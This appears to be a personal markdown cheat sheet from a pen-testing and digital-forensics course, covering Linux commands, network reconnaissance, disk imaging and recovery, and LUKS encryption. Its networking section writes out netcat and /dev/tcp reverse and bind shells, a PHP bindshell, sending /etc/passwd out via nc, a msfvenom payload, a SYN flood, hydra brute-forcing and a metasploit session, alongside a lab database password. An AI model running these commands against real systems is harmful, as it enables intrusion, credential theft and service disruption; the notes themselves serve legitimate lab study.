# Important CLI commands & hacks for fun and profit

This document contains important cli commands, pen testing tools, forensic hacks and more!

## Cheatsheets

- https://github.com/nirvikagarwal/awesome-ctf-cheatsheet

## Linux Audit Script

- https://github.com/sokdr/LinuxAudit/blob/master/LinuxAudit.sh

## Command line stuff

### Important folders and files

```bash
/etc/password
/etc/shadow
/var/log
/usr/share/wordlists/ -> kali wordlists (locate wordlists)
less  /usr/share/wordlists/rockyou.txt # good for passwords (kali)
```

### Basics

```bash
# german keyboard layout
setxkbmap -layout de # -> move to ~/.bashrc

# get root in kali
sudo bash

# word count
wc -w hacks.md

# find stuff
locate stuff
find /some/path/ -name "stuff"
find /some/path/ -name "*.js"
find /mnt/evid/ -type f # find (allocated) regular files

# SUID bit - find binaries with the SUID bit set
find / -perm -4000 -type f 2>/dev/null

# find files by content
egrep -ir --include=*.{php,html,js} "(document.cookie|setcookie)" /some/path/
find /some/path/ -type f -name "*.php" -o -name "*.html" -o -name "*.js" | \
 xargs egrep -i '(document\.cookie|console.log)'| less

# find content in files
egrep 'some-string' hacks.md
# search domains
egrep '(www\.)?.*\.[a-z]{2,6}(\.[a-z]{2,4})?' hacks.md
# search IP addresses
egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' hacks.md

grep -F 192.168.1.254 access.log
# searches for any IP address in the 192.168.1.0/24 subnet
grep -r 192\.168\.1\.[\d]{1,3} ./*

# file info: (is it really a txt file?)
file ~/Desktop/foo.txt
/Users/foo/Desktop/foo.txt: PDF document, version 1.3 # (😁 pdf was just renamed to foo.txt)

# time stuff
uptime
date
uptime

# execute stuff with timeout
timeout 10 ping foo.de

# hashsums
sha256sum package.json

# random numbers
echo $RANDOM

# execute in background
stress-ng --cpu 2 &
...do other stuff
# bring it back to foreground to kill it
fg

# Restart services
service apache2 restart
sudo systemctl restart mysql

# get distro/linux version
cat /etc/*-release
lsb_release -a
uname -a
uname -mrs
cat /proc/version

# caesar chiffre
tr "A-Za-z" "N-ZA-Mn-za-m" < text.txt > encrypted.txt
tr "A-Za-z" "N-ZA-Mn-za-m" < encrypted.txt > text.txt
# direct text encryption :D
echo "Hallo Welt " | tr "A-Za-z" "N-ZA-Mn-za-m"
echo "Unyyb Jryg" | tr "A-Za-z" "N-ZA-Mn-za-m"

# PGP encryption: https://pgptool.org/
# Example: Encrypt with pubkey, then decrypt locally with my privkey:
gpg --decrypt pgp-message.encrypted.txt

# Open files:
open foo.txt # OSX
display foo.txt # linux

# Archives: tar / zip
tar tzf myfile.tar.gz # only display contents
tar xzvf myfile.tar.gz # extract all stuff
# extract 7-zip files
7z x FILENAME.7z -p'somePassw0rd' -o/home/kali
```

### Linux User Management & Access Control

- `chmod +rwx filename` # to add permissions.
- `chmod -rwx directoryname` # to remove permissions.
- `chmod +x filename` # to allow executable permissions.
- `chmod -wx filename` # to take out write and executable permissions.

User Management

- `adduser`: add a user to the system
- `deluser`: delete a user account and related files

Relevant Files

- `/etc/passwd` (user information)
- `/etc/shadow` (protected passwords)

Group Management

- `addgroup`: add a group to the system
- `delgroup`: remove a group from the system

Relevant Files

- `/etc/group` (group information)

```bash
# Access conrol lists
# Then, limit the permissions of user bob to only reading by using ACLs:
setfacl -m u:bob:xr logs
# Check the configuration and the extended attributes:
getfacl logs
```

### Networking

```bash
# "Mininet creates a realistic virtual network, running real kernel, switch and application code, on a single machine (VM, cloud or native), in seconds, with a single command"
sudo mn --switch lxbr # see https://net.hs-augsburg.de/

# info about linux system
hostname -A
ip addr
nmcli
nmcli device show
nmcli connection show

# Active Internet connections (including servers)
netstat -at
ifconfig

netstat -tunp

# Routing tables
netstat -r -n

# ARP table
arp -a

# displays the route a packet took to reach the host
traceroute google.com

# logged in users on system (login)
w
who -T
last
finger

# all processes
ps -ef
lsof

ss -at
# check open ports on a host
ss -tln
ss -lun
# osx/mac
lsof -i tcp:4444 # Which process is listening in port 4444
lsof -i -P | grep -i "listen" # check all open ports

# SSL certificates
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt -config configs/server.conf
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout client.key -out client.crt -config configs/client.conf

# infos about certs
openssl x509 -in server.crt -text -noout
openssl x509 -in client.crt -text -noout

# check certs of a website
go run ssllabs-scan-v3.go --json-flat mwager.de

# ALSO CHECK NETCAT (nc) BELOW!

# finds emails of a domain
theHarvester -d mwager.de -b google

# Domain enumeration
sublist3r -d hs-augsburg.de

# DNS stuff
nslookup -type=ns hs-augsburg.de
Server: 10.0.2.3
Address: 10.0.2.3#53

Non-authoritative answer:
hs-augsburg.de nameserver = deneb.dfn.de.
hs-augsburg.de nameserver = av2.RZ.FH-Augsburg.de.
hs-augsburg.de nameserver = primestation.RZ.FH-Augsburg.de.

dig MX hs-augsburg.de
dig AXFR domain nameserver
host -l hs-augsburg.de nameserver
host  hs-augsburg.de av2.RZ.FH-Augsburg.de

nslookup -type=mx lecture2.local 10.5.13.21
nslookup -type=soa internal-lecture.local 10.5.13.21

# scanning
- arping -n -i HOST # sudo
- tcpdump # wireshark light -> sudo tcpdump -n -i eth0
- ICMP -> ping

# nmap
# -A Enable OS detection, version detection, script scanning, and traceroute
nmap -v -A scanme.nmap.org

# scan network ports: -sn: Ping Scan - disable port scan
nmap -v -sn scanme.nmap.org/16

# -sV -> check services running!
nmap -v -A -sV scanme.nmap.org

# nmap scannt per default 1000 well known ports!
# Scann ALL PORTS:
sudo nmap -A -sV -T5 10.5.123.0/24 -p- # also "-p-"

# execute a SYN flooding attack
sudo timeout 10 hping3 -S --flood 192.168.13.13

# get ip and mac of neighbour
ip neigh

# netcat (nc) - TCP/IP swiss army knife

nc 10.5.123.202 41414
ac9e06fafa7d76bade9106541dc4165dfb18155b580e2ab11924926f9583164a

# start netcat server
# listen on port 4444 (e.g. on my host)
nc -lnvp 4444

# if I can upload a php file and get it to execute: shell access via bindshell
# php bindshell:
system("nc -lnvp 4444 -e /bin/bash");

# SEND file content (eg executables) to a server
# server:
nc -lnvp 4444 > foobar.txt
# client:
nc IP PORT < /etc/passwd

# GET file content (eg password files) from a server
# server:
nc -lnvp 4444 < /etc/passwd
# client:
nc IP PORT > some_file

# scp download folder
scp -r UserName@SourceHost:SourceDirectoryPath TargetFolderName
# scp upload folder
scp -r /path/to/folder UserName@SourceHost:DestDirectoryPath

# SHELL via nc ❤️❤️❤️
# On Host:
nc -l -p 4444 -e /bin/bash
# Client:
ss -tln
nc 127.0.0.1 4444
whoami
root
...HAHAHAHAH

# /dev/tcp
echo "HALLO" >&/dev/tcp/127.0.0.1/4444
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# python shells
python -c 'import pty; pty.spawn("/bin/sh")'

# kali: /usr/share/webshells 😁
# -> locate webshell

# Other tool: man socat ;)

# Other tool: Creating a Custom Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp - f elf LHOST=10.5.155.80 LPORT=4444 > shell

- bind shell: server waits for me to connect
- reverse shell: I am waiting for e command on the server to connect to my listener

Search for connected machines
shodan.io

Dark Web Monitoring
- flare.io https://flare.io/solutions/use-case/dark-web-monitoring/

# Find URLs/directories on hosts

- DirBuster (UI. check with /usr/share/wordlists/dirb/small.txt)
- CLI:
dirb https://mwager.de/ /usr/share/wordlists/dirb/small.txt -v

oder

gobuster dir --url https://mwager.de/ -w /usr/share/wordlists/dirb/small.txt
gobuster dir --url 10.5.22.8 -w /usr/share/wordlists/dirb/small.txt

# Burb Suite -> perform attacks on web applications
- TODO

mysql --host=10.5.134.178 --user=important_user --password=52991835a76dc17085dcfdf27159bc4a228d53fe91e695031704ff1a5e2a786b

# Nikto Web Scanner
# Scan web servers in search of vulnerabilities and common dangerous configurations
nikto -h https://mwager.de

# Fast and customisable vulnerability scanner based on simple YAML based DSL.
# https://github.com/projectdiscovery/nuclei/
nuclei

# skipfish
# Find vulnerabilities in web apps.
rm -rf /tmp/skip
touch new_dict.wl
skipfish -t 90 -i 90 -w 90 -f1000 -b f -o /tmp/skip -W ./new_dict.wl http://testphp.vulnweb.com

# Wapiti
# Find vulnerabilities in web apps.
wapiti  -v 1  -u http://testphp.vulnweb.com/ -f txt -o /tmp/wapiti --flush-session

# whatweb
# Get information from hosts: e.g. apache vX.X, jQuery vx.X, modernizr, IP adress etc...
whatweb -v mwager.de
whatweb -v 192.168.0.1/24

# Wordpress
wpscan --url http://wordpress-installation.com

# SMB STUFF - find samba shared network devices

nmap -p 139,445 192.168.2.120
sudo nbtscan -r 192.168.2.120
enum4linux -a 192.168.2.120

# SNMP - simple network management protocol
nmap -sU -p 161 <network>
snmpwalk -v1 IP -c public iso.3.6.1.2.1.1.1.0
# get running processes:
snmpwalk -v1 10.5.81.65 -c public 1.3.6.1.2.1.25.4.2.1.2


# find smtp users
nc -c IP 25
VRFY root # -> answer: does user "root" exist or not?
-> also possible via lists
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt  -t 10.5.72.178
# mit -D für die domain!
smtp-user-enum -M VRFY -U /usr/share/wordlists/npt_list.txt -t 10.5.72.178 -D mailserv

# Generate wordlist from website (Custom Word List generator)
cewl -w generated_wordlist.txt -d 1 -m 5 https://mwager.de

# Password cracking: hydra
man hydra
# also:
crunch, john the ripper etc...
john --wordlist=/usr/share/wordlists/npt_list.txt shadow-file # eg /etc/shadow

# ARP stuff: use bettercap!

# SQL injection: sqlmap
sqlmap -u example.com/login?user=a&pass=b

# metasploit example
$ sudo nmap -sS 10.5.123.80
PORT STATE SERVICE
21/tcp open ftp <---

msfconsole

> search pureftp
> use 0
> show options
> set payload linux/x86/shell/bind_tcp
> set rhost 10.5.123.80
> exploit
>
> > whoami
> > cat /root/flag
```

### Password crask hacks

```
locate wordlist

BEST for passwords:
$ less  /usr/share/wordlists/rockyou.txt

# THIS WORKS:
echo "sdasdsa' or '1' = '1" > mylist.txt
hydra -l test -P ./mylist.txt testphp.vulnweb.com http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:If you are already registered " -V

# This also:
hydra -l test -P /usr/share/dirb/wordlists/big.txt 10.5.134.55 -s 90 http-post-form "/pass/index.html:password=^PASS^:405" -V

touch wl.txt
echo "foo" > wl.txt
hydra -l mail@mwager.de -P ./wl.txt https://testphp.vulnweb.com http-post-form "/login:emailOrPhone=^USER^&password=^PASS^" -V


# Block 10 Aufgabe 1:
$ hydra -l jacobs -P /usr/share/wordlists/npt_list.txt 10.5.201.23  ssh -V -I
[22][ssh] host: 10.5.201.23   login: jacobs   password: daniela

# hydra wordpress:
# 1. check for usernames:
hydra -vV -L fsocity.dic -p wedontcare 10.10.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

few minutes later....
>> [80][http-post-form] host: 192.168.2.4 login: elliot password: mypassword

# 2. check for password:
hydra -vV -l elliot -P fsocity.dic 10.10.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'

# Wordpress msfconsole (if you have admin access)
https://blog.christophetd.fr/write-up-mr-robot/

also:
crunch, john the ripper etc...

john --wordlist=/usr/share/wordlists/npt_list.txt shadow-file # eg /etc/shadow
```

### Discs & Forensics

```bash
strings /some/binary/fat.raw | less
strings /dev/sdb | less

# get filesystem
fstyp /dev/disk2s1 # partition of a usb stick
file /dev/disk2s1

# Mounting
mount -t hfs /dev/disk2s1 /tmp
# Disk read-only? fix it:
sudo hdparm -r0 /dev/sdb

# Mount a raw hfs image in OSX
0. sudo dd if=/dev/disk2 of=/Volumes/Backup2/olddisk.raw bs=8m conv=noerror,sync # ~13h for 500GB
1. hdiutil attach -imagekey diskimage-class=CRawDiskImage -nomount /Volumes/Backup2/olddisk.raw
2. in disk utils „aktivieren“ - all data accesible!
```

#### Linux disk encryption (cryptsetup & LUKS "Linux Unified Key Setup")

LUKS (Linux Unified Key Setup) is a cross distribution, kernel based disk encryption standard. A central component of which is that all necessary setup information is stored within the format header; giving full decryption portability.

```
sudo bash
# create container
dd if=/dev/urandom of=container.enc bs=1M count=32

# create random key of 32 byte (256 bits) :-)
dd if=/dev/urandom of=keyfile.key bs=32 count=1

# Use luksFormat to initialize the file container with LUKS and your key file:
cryptsetup -q -v luksFormat container.enc keyfile.key

# OPEN your LUKS file container container.enc and map it to the virtual device dm_enc.
# Will create it inside "/dev/mapper"
cryptsetup -v -d keyfile.key luksOpen container.enc dm_enc

# check status:
cryptsetup status /dev/mapper/dm_enc

# create an ext2 FS (only needed once. sobald created einfach immer: luksOpen+mount und unmount+luksClose)
mke2fs /dev/mapper/dm_enc

# mount it
mkdir /mnt/enc_con
mount /dev/mapper/dm_enc /mnt/enc_con

# size of container vs size of partition/encr. disk:
ls -lah container.enc
fdisk -l /dev/mapper/dm_enc
df -hT /dev/mapper/dm_enc

# close/remove all
umount /mnt/enc_con
rm -r /mnt/enc_con
cryptsetup luksClose dm_enc
rm container.enc keyfile.key
```

#### Info about disks & their sizes

```bash
file usb.dd

# mounted stuff
mount -v
ls /media # ls /Volumes

# Disk size
df -H
du -sh /some/path

lsblk # get disks and moutpoints

# get devices and vendor information
lspci

# list all devices (hard dicks, usb sticks, cd rom drives)
lsscsi

# list hardware
lshw

# OSX
# Output all devices
diskutil list # also spits out the mount names (e.g. "Macintosh HD" or "USBSTICK")
diskutil unmountDisk /dev/disk2
# For more info on apple filesystems see HFS_TSK.pdf in this folder

# Get partitions of a disk
sudo fdisk -l /dev/sda
gdisk -l /dev/sdb

# Get detailed infos about a disk
sudo hdparm -I /dev/sda
sudo ewfacquire /dev/sda
# detailed infos (last mount time, block size, block groups etc)
sudo fsstat -o 0 /dev/sdc # hier here offset 0. maybe before mmls on the disk
sudo dumpe2fs /dev/sdc


tree /mnt/evidence
# Making a List of Hashes
find /mnt/evidence -type f -exec sha1sum {} \; > ~/analysis/sha1.filelist.txt

# Making a List of File Types
find /mnt/evidence -type f -exec file {} \; > ~/analysis/filetype.txt

# search for string in an image
grep -abi cyberbullying ewfmnt/ewf1
# use tr to convert the set of control characters (’[:cntrl:]’) to newlines (’\n’).
tr '[:cntrl:]'  '\n' < ewfmnt/ewf1 | grep -abi cyberbullying

# Also see bulk_extractor! (e.g. in Linux leo)
```

#### Copy/Backup files or disks / Creating forensic images

```bash
dd if=/dev/sda of=/path/to/my/backup bs=512 conv=noerror,sync [status=progress] # ==> press ctrl + t to see progress

# forensics extension of dd (e.g. hashing check auto!)
dc3dd if=/dev/sda hof=/path/to/my/backup.raw hash=sha256

# -> FTK Imager is GUI & free (win only)

# over ssh - copy stuff !*encrypted*! and gzipped to my ssh server
dd if=/dev/sda | pv | gzip -c | ssh USER@IP "cat > sda.dd"
# also see sshfs ?!

# EWF (Expert witness format)
ewfaquire -t image.dd image.E01
ewfexport image.E01

# Writeblocker software based windows:
# https://www.youtube.com/watch?v=sOy0Sdyma3U
```

#### WIPE a disk (CAUTION)

```bash
dd if=/dev/zero of=/dev/sdb(1) # wipe whole disk or just a partition
dd if=/dev/random of=/dev/sdb
# specialized tool:
dc3dd wipe=/dev/sdb

# hex editor (hexeditor)
# verify that our command to write zeros to a whole disk was a success?
# xxd is a cli hex editor
xxd -a /dev/sdb
```

#### Filesystems

```bash
# MBR (Master boot record) - Sector 0 (partition infos, attack vector...)
# Bootcode Byte 0-439
# Disksignature Byte 440-443
# reserved Byte 444-445
# Partitiontable Byte 446-509 (4 x 16byte)
# Signature 0x55 0xAA 510-511
# Copy only the MBR:
sudo dd if=/dev/disk2 of=ntfs.raw bs=512 count=1 skip=0
```

FAT Analyse
https://www.youtube.com/watch?v=lz83GavddB0

#### Recover data

See also: https://github.com/mwager/ext3-seminararbeit

Linux GUI for image analyse: dff (digital forensic framework) - similar to FTK imager

```bash
# Tools for WIN: recuva, PC inspektor file recovery, DiskDigger, GlaryUndelete
# Tools for MAC: Disk Drill

# Tools for Linux:
foremost usb.dd # auto extract deleted files
# Autopsy: create image(dd or ftk imager) and then import it in autopsy.
# The Sleuth Kit (TSK)
# See Linux LEO from chapter 10.2
# Ex: show all deleted files in a ntfs image
fls -o 2048 -Frd NTFS_Pract_2017.E01
# OUTPUT (notice the number 219)
-/r * 219-128-2:	Users/AlbertE/Pictures/Tails/GemoTailG4.jpg
# get MFT info like standard info attribute etc
istat -o 2048 NTFS_Pract_2017.E01 219
# Now lets recover that deleted file:
icat -o 2048 NTFS_Pract_2017.E01 219 | file - # check file type
icat -o 2048 NTFS_Pract_2017.E01 219 > image.jpg # create a file from extracted content 😍
```

Manually carving files from NTFT Master file table (MFT:) (RunLists/Data runs)
https://www.youtube.com/watch?v=AbApUDui8wM

#### The Sleuth Kit (TSK)

See chapter 10.2 in the Linux LEO PDF: https://linuxleo.com/ and http://www.sleuthkit.org/

```bash
# which filesystems are supported by TSK?
istat -f list

# mmls - Display the partition layout of a volume system  (partition tables)
mmls image.dd # also possible on EWF files: mmls image.E01

# ifind - Find the meta-data structure that has allocated a given disk unit or file name

# icat - Output the contents of a file based on its inode number
# Example: get the MFT only (63 is Start of NTFS from mmls)
# See https://www.andreafortuna.org/2017/07/18/how-to-extract-data-and-timeline-from-master-file-table-on-ntfs-filesystem/
icat -o 63 image.E01 0 > mft.raw

# Then analyze the MFT:
analyzeMFT.py -f mft.raw -o mftanalyzed.csv

fls usb_stick.dd
fdisk -lu usb.dd
fsstat usb.dd

# Mounting EWF Files with ewfmount (See linux leo 8.12.9)
ewfverify NTFS_Pract_2017.E01
ewfmount NTFS_Pract_2017.E01 /mnt/ewf
mount -o ro,loop,offset=$((2048*512))  /mnt/ewf/ewf1 /mnt/evid

ewfmount DC01_DW-disk1.e01 /mnt/DC01
mount –o loop,ro,show_sys_files,streams_interface=windows /mnt/DC01/ewf1 /mnt/windows_mount
```

#### log2timeline

#### RAM

```bash
# Older unix:
dd if=/dev/ram of=ram.dd
# fmem: https://github.com/NateBrune/fmem
# osx: MacMemoryReader
# alternative via firewire (if pc locked (i.e. screensaver))
```

## GDB

1. mit scp die binary auf kali host downloadn
2. gdb ./flag-extramile4
3. > start
4. > disas

```
Dump of assembler code for function main:
0x00005555555551e6 <+0>: push rbp
0x00005555555551e7 <+1>: mov rbp,rsp
=> 0x00005555555551ea <+4>: sub rsp,0xe0
0x00005555555551f1 <+11>: mov DWORD PTR [rbp-0xd4],edi
0x00005555555551f7 <+17>: mov QWORD PTR [rbp-0xe0],rsi
0x00005555555551fe <+24>: lea rdi,[rip+0xe08] # 0x55555555600d
0x0000555555555205 <+31>: call 0x555555555050 <system@plt>
0x000055555555520a <+36>: test eax,eax
0x000055555555520c <+38>: jne 0x555555555238 <main+82>
0x000055555555520e <+40>: mov rax,QWORD PTR [rip+0x2e4b]
```

5. break \*0x000055555555520a
6. run
   -> breakt dann direkt bei \*0x000055555555520a

7. info reg eax

output 0

8. set $eax=1

WICHTIG: jne sprint wenn eax NICHT 0 is.
deshalb setzen wir eax einfach hart auf 1 HAHAHAHHAHAH

9. nun steppen bis wir den flag haben. NICE!!!

## Bootable USB sticks

- Use "rufus" for persietence: https://www.youtube.com/watch?v=n2olKupv9fY

## Google searches

`site:foo.de inurl:wp-admin`

## data visualization via gnuplot

See folder `./gnuplot`

## Security Tools

### SCA tool free: OWASP depscan: https://github.com/owasp-dep-scan/dep-scan

depscan --src $PWD --reports-dir $PWD/reports


## Docker stuff

```
Cleaning up your old containers
#!/bin/bash
sudo docker stop $(sudo docker ps -aq)
sudo docker rm $(sudo docker ps -aq)
sudo docker rmi $(sudo docker images -q)
sudo docker volume rm $(sudo docker volume ls -q)
sudo docker network rm $(sudo docker network ls -q)
```
